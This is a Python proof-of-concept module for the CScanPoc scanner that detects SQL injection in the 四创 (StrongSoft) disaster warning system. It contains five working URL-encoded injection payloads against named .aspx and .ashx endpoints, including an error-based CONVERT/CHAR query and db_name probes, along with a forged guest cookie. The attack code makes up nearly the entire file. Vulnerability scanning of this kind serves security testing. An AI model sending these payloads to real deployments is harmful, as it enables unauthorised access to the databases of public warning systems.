# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'StrongSoft_0002'  # 平台漏洞编号，留空
    name = '四创灾害预警系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-20'  # 漏洞公布时间
    desc = '''
        四创灾害预警系统
        /DefaultLeftMenu.aspx
        /DefaultLeftMenu.aspx
        /SystemManage/SysGeneral/SysGeneralShow.aspx
        /Warn/AjaxHandle/AjaxDeleteMsgInfo.ashx
        /Duty/write/FileType.aspx
        存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0108828、0108604'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '四创灾害预警系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f48c7203-31aa-4cc1-b9d3-944a4aab2984'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-0108828
            # refer:http://www.wooyun.org/bugs/wooyun-2010-0108604
            hh = hackhttp.hackhttp()
            host = urllib.parse.urlparse(self.target).hostname
            cookie = 'ASP.NET_SessionId=dlsnv245vsnx1s45vhajsx45; UserId' + host + '=guest'
            payloads = [
                '/DefaultLeftMenu.aspx?MenuId=1%27%20and%20db_name%281%29%3E1--',
                '/DefaultLeftMenu.aspx?MenuId=1%27%20and%20db_name(1)%3E1--',
                '/SystemManage/SysGeneral/SysGeneralShow.aspx?MenuId=1%20and%20db_name%281%29%3E1--',
                '/Warn/AjaxHandle/AjaxDeleteMsgInfo.ashx?action=DeleteMsg&msgid=%28CONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2bCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28106%29%2bCHAR%28113%29%2b%28SELECT%20%28CASE%20WHEN%20%289134%3D9134%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2bCHAR%28113%29%2bCHAR%28113%29%2bCHAR%28118%29%2bCHAR%28118%29%2bCHAR%28113%29%29%29%29',
                '/Duty/write/FileType.aspx?hideBtn=1&ID=1%27%2bdb_name(1)%2b%27'
            ]
            for payload in payloads:
                url = self.target + payload
                code, head, res, errcode, _ = hh.http(url, cookie=cookie)

                if code == 500 and 'master' in res or 'qqpjq1qqvvq' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
